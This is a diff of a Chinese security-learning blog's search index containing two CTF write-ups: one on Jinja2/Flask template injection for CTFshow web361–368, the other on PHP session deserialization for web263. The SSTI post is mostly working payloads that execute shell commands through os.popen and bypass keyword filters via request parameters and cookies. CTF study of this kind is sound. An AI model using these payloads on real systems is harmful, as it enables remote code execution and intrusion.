-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>最喜欢的最短的一个:</p>
-<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
-<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
-<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
-<p>参数逃逸，好喜欢，高效帅气巧妙</p>
-<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
-<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
-<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
-<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
-<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
-<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
-<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
-<p>和上题一样的payload</p>
-<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
-<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
-<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>原来之前可以不用cookie，用values就好</p>
-<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
-<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
-<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
-<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><p>过滤了&#96;</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nodejs-ctfshow</title>
     <url>/2024/03/02/nodejs-ctfshow/</url>
     <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
@@ -460,72 +395,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php_Session反序列化学习</title>
-    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
-
-<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
-<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
-<p>简单写个前后端</p>
-<p>注册</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
-<p>填入后可以看到在tem目录下的session文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
-<p>登录</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
-<p>我们就实现了这个功能</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
-<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
-<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
-<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
-<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
-<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
-<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
-<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
-<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
-<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
-<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
-<p>之后再打开登录文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
-<p>修改成功</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
-<p>题面，看源码，抓包无果，直接开扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
-<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
-<p>发现漏洞点</p>
-<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
-<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
-<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
-<p>最后的payload如下 :</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
-<p>然后连接读取flag即可</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>php反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
     <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
     <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>
@@ -591,6 +460,137 @@
       <tags>
         <tag>漏洞复现</tag>
         <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI-CTFSHOW</title>
+    <url>/2024/03/29/SSTI-CTFSHOW/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>巨几把详细，使我逐渐理解一切</p>
+<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
+<p>需要在url传入name&#x3D;payload</p>
+<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
+<p>小写了个脚本去找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
+<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
+<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
+<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
+<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
+<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
+<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
+<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
+<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
+<p>payload4:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最喜欢的最短的一个:</p>
+<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
+<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
+<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
+<p>参数逃逸，好喜欢，高效帅气巧妙</p>
+<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
+<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
+<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
+<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
+<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
+<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
+<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
+<p>和上题一样的payload</p>
+<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
+<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
+<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
+<p>原来之前可以不用cookie，用values就好</p>
+<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
+<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
+<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
+<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
+<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><p>过滤了&#96;</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php_Session反序列化学习</title>
+    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
+
+<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
+<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
+<p>简单写个前后端</p>
+<p>注册</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
+<p>填入后可以看到在tem目录下的session文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
+<p>登录</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
+<p>我们就实现了这个功能</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
+<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
+<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
+<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
+<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
+<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
+<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
+<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
+<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
+<p>之后再打开登录文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
+<p>修改成功</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
+<p>题面，看源码，抓包无果，直接开扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
+<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
+<p>发现漏洞点</p>
+<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
+<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
+<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
+<p>最后的payload如下 :</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
+<p>然后连接读取flag即可</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>学习</tag>
+        <tag>php反序列化</tag>
       </tags>
   </entry>
   <entry>
